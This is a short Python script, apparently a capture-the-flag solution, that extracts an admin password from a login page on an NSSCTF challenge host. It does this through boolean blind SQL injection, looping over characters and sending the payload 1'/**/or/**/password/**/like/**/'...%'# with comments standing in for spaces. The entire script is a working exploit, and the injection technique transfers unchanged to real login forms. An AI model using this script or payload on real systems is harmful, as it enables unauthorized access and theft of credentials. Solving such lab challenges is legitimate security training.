import requests

url = 'http://node4.anna.nssctf.cn:28232/index.php'
str = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
flag = ''
for i in range(62):
    for j in str:
        data = {
            'username': 'admin', "password": f"1'/**/or/**/password/**/like/**/'{flag + j}%'#"
        }
        # print(data)
        response = requests.session().post(url=url, data=data)
        # print(response.text)
        if "something wrong" not in response.text:
            flag = flag + j
            print(flag)
            break
print(flag)
